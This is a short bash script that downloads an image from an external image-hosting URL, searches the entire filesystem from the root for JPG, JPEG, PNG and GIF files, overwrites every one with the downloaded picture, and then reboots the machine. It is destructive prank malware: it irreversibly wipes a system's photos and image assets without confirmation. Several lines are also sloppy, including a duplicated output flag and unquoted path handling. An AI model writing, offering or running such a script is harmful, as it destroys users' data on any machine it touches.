#!/bin/bash

# Download the image and save it as "image.jpg" or "image.jpeg"
wget -qO output.jpg "https://i.postimg.cc/nLwf48bX/styerteletubby.png" -O image.jpg 

# Replace all images on the system with the downloaded image
replacement_image="$(pwd)/image.jpg" || replacement_image="$(pwd)/image.jpg"

# Find all image files on the system
image_files=$(find / -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" \))

# Loop through all image files and replace them
for image_file in $image_files
do
    echo "Replacing $image_file..."
    cp "$replacement_image" "$image_file"
done

echo "All images on the system have been replaced with the downloaded image."
reboot
